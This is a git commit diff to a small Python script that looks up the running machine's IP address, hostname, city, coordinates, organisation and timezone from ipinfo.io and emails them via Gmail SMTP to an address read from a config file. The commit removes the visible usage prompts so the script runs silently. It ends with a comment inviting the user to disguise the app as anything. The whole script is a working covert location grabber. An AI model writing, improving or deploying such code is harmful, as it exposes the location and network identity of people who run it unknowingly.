ecb748c52ea6a5bae011a0c5500263e051459193
Adam Sarhan <adamsa09@gmail.com>
2021-02-27 14:49:03 -0500

    Getting more useful. Configure your email and the info you want in the config.json file.

--- main.py
+++ main.py
@@ -9,9 +9,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 
-if len(argv) < 2:
-    print('-i   Get IP address\n-h   Get hostname\n-c   Get city\n-r   Get region\n-co  Get country\n-l   Get location (long, lat)\n-o   Organizion\n-p   Postal\n-t   Timezone\n-a   All Info')
-    exit()
+# Before you start, go to https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4O13KGBUwF9HwEI0q6D634Jj7VWs9WEG4fnoJhshHctblM9kwofamyR0lqEjekUtfJ9PWn8O73_1ywEhFwVaYVhsV-_Pg\nand enable less secure apps. When finished, click enter in the console.
 
 print('Loading...')
 r = requests.get('https://ipinfo.io')
@@ -19,48 +17,56 @@ ipinfo = r.json()
 os.system('cls')
 
 
-def findinfo():
+def findinfo(data):
     msg = ''
-    if '-i' in argv:
+    if '-i' in data['args']:
         msg = msg + 'IP ' + ipinfo['ip'] + ','
-    if '-h' in argv:
+    if '-h' in data['args']:
         msg = msg + 'HOSTNAME ' + ipinfo['hostname'] + ','
-    if '-c' in argv:
+    if '-c' in data['args']:
         msg = msg + 'CITY ' + ipinfo['city'] + ','
-    if '-r' in argv:
+    if '-r' in data['args']:
         msg = msg + 'REGION ' + ipinfo['region'] + ','
-    if '-co' in argv:
+    if '-co' in data['args']:
         msg = msg + 'COUNTRY ' + ipinfo['country'] + ','
-    if '-l' in argv:
+    if '-l' in data['args']:
         msg = msg + 'LATITUDE, LONGITUDE LOCATION ' + ipinfo['loc'] + ','
-    if '-o' in argv:
+    if '-o' in data['args']:
         msg = msg + 'ORGANIZATION ' + ipinfo['org'] + ','
-    if '-t' in argv:
+    if '-t' in data['args']:
         msg = msg + 'TIMEZONE ' + ipinfo['timezone'] + ','
 
     return msg
 
 
-port = 465
+sender_email = ''
+sender_password = ''
+recv_email = ''
+message = ''
+subject = ''
 
+with open('config.json') as f:
+    data = json.load(f)
+    sender_email = data['sender_email']
+    sender_password = data['sender_password']
+    recv_email = data['recv_email']
+    subject = data['subject']
+    message = findinfo(data)
 
-context = ssl.create_default_context()
-
-input("Before we start, go to\nhttps://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4O13KGBUwF9HwEI0q6D634Jj7VWs9WEG4fnoJhshHctblM9kwofamyR0lqEjekUtfJ9PWn8O73_1ywEhFwVaYVhsV-_Pg\nand enable less secure apps. When finished, click enter in the console.")
-
-sender_email = input('What is your gmail: ')
-sender_password = input(
-    'Enter your gmail password. If you are unsecure about typing it here feel free to view the source code: ')
-recv_email = input('Where should I send the info (enter an email): ')
-message = findinfo()
-subject = input("Subject: ")
 msg = MIMEMultipart()
 msg['Subject'] = subject
 msg['From'] = sender_email
 msg['To'] = recv_email
 msg.attach(MIMEText(message))
 
+port = 465
+
+
+context = ssl.create_default_context()
+
 
 with smtplib.SMTP_SSL('smtp.gmail.com', port, context=context) as server:
     server.login(sender_email, sender_password)
     server.sendmail(sender_email, recv_email, msg.as_string())
+
+# Here you can disguise the app as whatever you want.
